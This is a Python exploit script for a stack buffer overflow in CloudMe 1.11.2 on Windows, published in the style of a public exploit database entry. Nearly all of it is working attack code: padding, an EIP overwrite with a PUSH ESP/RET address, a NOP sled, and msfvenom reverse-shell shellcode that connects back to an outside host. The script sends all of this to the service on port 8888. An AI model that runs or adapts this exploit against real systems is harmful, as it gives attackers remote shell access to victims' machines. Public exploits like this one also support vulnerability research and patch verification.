# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.54 LPORT=5555 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
payload =  b""
payload += b"\xdb\xc9\xbd\x3a\x1a\x9e\x91\xd9\x74\x24\xf4\x5f"
payload += b"\x31\xc9\xb1\x52\x31\x6f\x17\x83\xef\xfc\x03\x55"
payload += b"\x09\x7c\x64\x55\xc5\x02\x87\xa5\x16\x63\x01\x40"
payload += b"\x27\xa3\x75\x01\x18\x13\xfd\x47\x95\xd8\x53\x73"
payload += b"\x2e\xac\x7b\x74\x87\x1b\x5a\xbb\x18\x37\x9e\xda"
payload += b"\x9a\x4a\xf3\x3c\xa2\x84\x06\x3d\xe3\xf9\xeb\x6f"
payload += b"\xbc\x76\x59\x9f\xc9\xc3\x62\x14\x81\xc2\xe2\xc9"
payload += b"\x52\xe4\xc3\x5c\xe8\xbf\xc3\x5f\x3d\xb4\x4d\x47"
payload += b"\x22\xf1\x04\xfc\x90\x8d\x96\xd4\xe8\x6e\x34\x19"
payload += b"\xc5\x9c\x44\x5e\xe2\x7e\x33\x96\x10\x02\x44\x6d"
payload += b"\x6a\xd8\xc1\x75\xcc\xab\x72\x51\xec\x78\xe4\x12"
payload += b"\xe2\x35\x62\x7c\xe7\xc8\xa7\xf7\x13\x40\x46\xd7"
payload += b"\x95\x12\x6d\xf3\xfe\xc1\x0c\xa2\x5a\xa7\x31\xb4"
payload += b"\x04\x18\x94\xbf\xa9\x4d\xa5\xe2\xa5\xa2\x84\x1c"
payload += b"\x36\xad\x9f\x6f\x04\x72\x34\xe7\x24\xfb\x92\xf0"
payload += b"\x4b\xd6\x63\x6e\xb2\xd9\x93\xa7\x71\x8d\xc3\xdf"
payload += b"\x50\xae\x8f\x1f\x5c\x7b\x1f\x4f\xf2\xd4\xe0\x3f"
payload += b"\xb2\x84\x88\x55\x3d\xfa\xa9\x56\x97\x93\x40\xad"
payload += b"\x70\x96\x9e\xbd\xb6\xce\x9c\xbd\xa3\xbd\x28\x5b"
payload += b"\xa1\xd1\x7c\xf4\x5e\x4b\x25\x8e\xff\x94\xf3\xeb"
payload += b"\xc0\x1f\xf0\x0c\x8e\xd7\x7d\x1e\x67\x18\xc8\x7c"
payload += b"\x2e\x27\xe6\xe8\xac\xba\x6d\xe8\xbb\xa6\x39\xbf"
payload += b"\xec\x19\x30\x55\x01\x03\xea\x4b\xd8\xd5\xd5\xcf"
payload += b"\x07\x26\xdb\xce\xca\x12\xff\xc0\x12\x9a\xbb\xb4"
payload += b"\xca\xcd\x15\x62\xad\xa7\xd7\xdc\x67\x1b\xbe\x88"
payload += b"\xfe\x57\x01\xce\xfe\xbd\xf7\x2e\x4e\x68\x4e\x51"
payload += b"\x7f\xfc\x46\x2a\x9d\x9c\xa9\xe1\x25\xbc\x4b\x23"
payload += b"\x50\x55\xd2\xa6\xd9\x38\xe5\x1d\x1d\x45\x66\x97"
payload += b"\xde\xb2\x76\xd2\xdb\xff\x30\x0f\x96\x90\xd4\x2f"
payload += b"\x05\x90\xfc"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)